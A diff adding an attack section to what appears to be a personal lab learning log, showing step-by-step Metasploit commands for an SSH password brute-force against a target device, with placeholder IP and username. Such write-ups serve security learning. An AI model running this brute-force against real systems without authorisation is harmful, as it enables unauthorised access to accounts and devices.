@@ -98,3 +98,53 @@ By looking at the results of the scan, I could see the vulnerable device was dis
 
 ### The attack
 
+To start my attack, I started **Metasploit** on my attack VM:
+```
+msfconsole
+```
+
+Once **Metasploit** has loaded (you will see `msf6 >`), I selected the SSH brute-force module:
+```
+msf6 > use auxiliary/scanner/ssh/ssh_login
+```
+
+> To see all configuration options, you can do `show options` and you will see a list of all the options you can edit:
+> ```
+> msf6 > auxiliary(scanner/ssh/ssh_login) > show options
+> ```
+
+To configure the attack, we need to adjust the following options:
+
+- Set target IP address (RHOSTS):
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > set RHOSTS x.x.x.x
+```
+
+- Set the username of the user you are trying to login with:
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > set USERNAME xxxxx
+```
+
+- Set the password list (PASS_FILE):
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/attackVM/passwords.txt
+```
+
+- Set `STOP_ON_SUCCESS` to stop running when the correct password is found:
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
+```
+
+- If you want to see all attempts printed out, you can set `VERBOSE` mode to `True`:
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
+```
+
+Once all options have been set, run the Brute force attack:
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > run
+```
+
+Metasploit will now attempt each password and create a SSH session on the device:  
+
+<img alt="Metasploit running bruteforce attack" src="/learning/logs/images/metasploit-bruteforce-running.png" width=500px>
